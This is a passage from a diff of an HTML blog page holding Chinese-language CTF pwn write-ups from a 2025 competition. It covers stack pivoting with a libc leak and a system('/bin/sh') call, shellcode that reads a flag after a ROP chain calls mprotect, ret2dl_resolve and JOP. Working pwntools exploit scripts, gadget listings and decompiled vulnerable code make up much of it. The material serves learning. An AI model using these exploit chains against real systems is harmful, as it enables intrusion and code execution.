elf.plt[&#x27;puts&#x27;]<br>puts_got = elf.got[&#x27;puts&#x27;]<br>ret = 0x40101a<br>rbp_ret = 0x40117d<br><br>p.recvuntil(&#x27;&gt; &#x27;)<br>payload = b&#x27;a&#x27;*0x40+p64(new_rbp) + p64(read)<br>p.send(payload)<br><br>payload1 =p64(new_rbp +0x800) +p64(rdi_ret)  + p64(puts_got)+ p64(puts_plt)+p64(read)+p64(leave_ret)<br>payload1 = payload1.ljust(0x40,b&#x27;a&#x27;) + p64(new_rbp-0x40) + p64(leave_ret)<br>p.send(payload1)<br>puts_libc = u64(p.recvline()[:-1].ljust(8,b&#x27;\x00&#x27;))<br>print(hex(puts_libc))<br>libc_base = puts_libc - libc.symbols[&#x27;puts&#x27;]<br>print(hex(libc_base))<br>system_addr = libc_base + libc.symbols[&#x27;system&#x27;]<br>bin_sh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))<br>print(hex(system_addr))<br>print(hex(bin_sh_addr))<br><span class="hljs-meta prompt_">#</span><span class="language-bash">gdb.attach(p)</span><br>payload2 = p64(new_rbp+0x800-0x40)+ p64(rdi_ret) + p64(bin_sh_addr) +p64(ret)+ p64(system_addr) + b&#x27;/bin/sh\x00&#x27;<br>payload2 = payload2.ljust(0x40,b&#x27;a&#x27;) + p64(new_rbp+0x800-0x40) + p64(leave_ret)<br>p.send(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
 
-<h1 id="20-sandbox"><a href="#20-sandbox" class="headerlink" title="20.sandbox"></a>20.sandbox</h1><p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1764224103693-a730992b-0a3b-49d5-b286-08a1285aa8db.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h1 id="20-sandbox"><a href="#20-sandbox" class="headerlink" title="20.sandbox"></a>20.sandbox</h1><img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1764224103693-a730992b-0a3b-49d5-b286-08a1285aa8db.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>静态链接，函数都在里面</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1764224127518-62404130-720d-4671-b1b2-1afccc8aa452.png" srcset="/img/loading.gif" lazyload alt="img">相应的文件也比较大</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1764224490898-1455aa48-8ced-4840-b491-dbe16bfd17ec.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1764224127518-62404130-720d-4671-b1b2-1afccc8aa452.png" srcset="/img/loading.gif" lazyload class="" title="img">相应的文件也比较大
+
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1764224490898-1455aa48-8ced-4840-b491-dbe16bfd17ec.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>n9在var4，n4在var8，输入四个数再输入1即可覆盖n9成为1实现多次循环</p>
 <p>存在gadget</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">               public gadget<br>.text:0000000000401A3C gadget          proc near<br>.text:0000000000401A3C ; __unwind &#123;<br>.text:0000000000401A3C                 endbr64<br>.text:0000000000401A40                 pop     rdi<br>.text:0000000000401A41                 retn<br>.text:0000000000401A41 gadget          endp ; sp-analysis failed<br>.text:0000000000401A41<br>.text:0000000000401A42 ; ---------------------------------------------------------------------------<br>.text:0000000000401A42                 pop     rsi<br>.text:0000000000401A43                 retn<br>.text:0000000000401A44 ; ---------------------------------------------------------------------------<br>.text:0000000000401A44                 pop     rdx<br>.text:0000000000401A45                 retn<br>.text:0000000000401A45 ; ---------------------------------------------------------------------------<br>.text:0000000000401A46                 db 90h<br>.text:0000000000401A47 ; ---------------------------------<br></code></pre></td></tr></table></figure>
@@ -787,7 +854,8 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br>context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)</span><br>p = remote(&#x27;192.168.136.1&#x27;,60342)<br>elf = ELF(&#x27;./pwn&#x27;)<br><br>buf = 0x4CEB60<br>bss = 0x4CEB60+0x200<br>mprotect =0x443520<br>pop_rdi = 0x401A40<br>pop_rsi = 0x401A42<br>pop_rdx = 0x401A44<br>shellcode=shellcraft.openat(-100,&#x27;./flag\x00&#x27;)<br>shellcode+=shellcraft.read(3,bss,0x50)<br>shellcode+=shellcraft.write(1,bss,0x50)<br>payload=asm(shellcode)<br>p.sendafter(&quot;You have a box, fill it.&quot;,payload)<br><br>payload1 = b&#x27;a&#x27;*4 + p32(1)<br>p.sendafter(&quot;Now, leave your name..&quot;,payload1)<br><br>rop=flat([<br>    pop_rdi,<br>    0x4ce000,<br>    pop_rsi,<br>    0x1000,<br>    pop_rdx,<br>    0x7,<br>    mprotect,<br>    buf<br>])<br><span class="hljs-meta prompt_">#</span><span class="language-bash">gdb.attach(p)</span><br>for i in range(8):<br>    p.sendafter(b&#x27;&gt;&#x27;,rop[i*8:i*8+8])<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
 <p>ps：sendline与send一定要区分，多了个line很容易出错</p>
-<h1 id="21-ret2dl-resolve"><a href="#21-ret2dl-resolve" class="headerlink" title="21.ret2dl_resolve"></a>21.ret2dl_resolve</h1><p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1765294776008-3a91c5b0-78e1-401a-9115-de775c408de9.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h1 id="21-ret2dl-resolve"><a href="#21-ret2dl-resolve" class="headerlink" title="21.ret2dl_resolve"></a>21.ret2dl_resolve</h1><img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1765294776008-3a91c5b0-78e1-401a-9115-de775c408de9.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>只有一个溢出，有gadget但是无法泄露</p>
 <p>ret2ld_resolve专门为此而发明</p>
 <p>通过延迟绑定机制，巧妙利用其过程劫持解析需要的函数</p>
@@ -800,11 +868,13 @@
 
 <h1 id="22-JOP"><a href="#22-JOP" class="headerlink" title="22.JOP"></a>22.JOP</h1><p>控制流完整性（CFI）保护:会让传统ROP无效</p>
 <p>JOP相当于分解的ROP指令</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1765328699218-095f52d3-cef3-4efb-beb6-0d889cdb00f3.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1765328699218-095f52d3-cef3-4efb-beb6-0d889cdb00f3.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs shell">unsigned __int64 program()<br>&#123;<br>  unsigned __int64 result; // rax<br>  int v1; // [rsp+Ch] [rbp-14h] BYREF<br>  __int64 v2; // [rsp+10h] [rbp-10h]<br>  unsigned __int64 v3; // [rsp+18h] [rbp-8h]<br><br>  v3 = __readfsqword(0x28u);<br>  v2 = 0;<br>  while ( (unsigned __int64)n_gestures &lt;= 7 )<br>  &#123;<br>    puts(&quot;0. Finish\n1. Walk\n2. Wave Hands\n3. Jump\n4. Turn around\n5. Stand still&quot;);<br>    printf(&quot;Choose your gesture: &quot;);<br>    if ( (int)_isoc99_scanf(&quot;%u&quot;, &amp;v1) &lt;= 0 )<br>      exit(1);<br>    switch ( v1 )<br>    &#123;<br>      case 0:<br>        goto LABEL_15;<br>      case 1:<br>        gestures[v2] = walk;<br>        ++n_gestures;<br>        goto LABEL_11;<br>      case 2:<br>        gestures[v2] = wave_hands;<br>        ++n_gestures;<br>        goto LABEL_11;<br>      case 3:<br>        gestures[v2] = jump;<br>        ++n_gestures;<br>        goto LABEL_11;<br>      case 4:<br>        gestures[v2] = turn;<br>        ++n_gestures;<br>        goto LABEL_11;<br>      case 5:<br>        gestures[v2] = stand_still;<br>        ++n_gestures;<br>LABEL_11:<br>        printf(&quot;What should I say after this gesture? &quot;);<br>        getchar();<br>        if ( !fgets(&amp;talks[16 * v2], 16, stdin) )<br>          exit(1);<br>        return result;<br>      default:<br>        puts(&quot;Invalid choice, try again.&quot;);<br>        break;<br>    &#125;<br>    ++v2;<br>  &#125;<br>LABEL_15:<br>  result = v3 - __readfsqword(0x28u);<br>  if ( result )<br>    _stack_chk_fail();<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>写入的talk存在溢出可以写入gestures</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1765328814155-6a5365a2-f720-4c8a-a17e-8773fc1cde59.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1765328814155-6a5365a2-f720-4c8a-a17e-8773fc1cde59.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>程序传入execute时会把rdi设置值为0x401235去执行，于是根据gift，rdi变成&#x2F;bin&#x2F;sh，call system，成功getshell</p>
 <p>布置JOP链：</p>
 <ul>
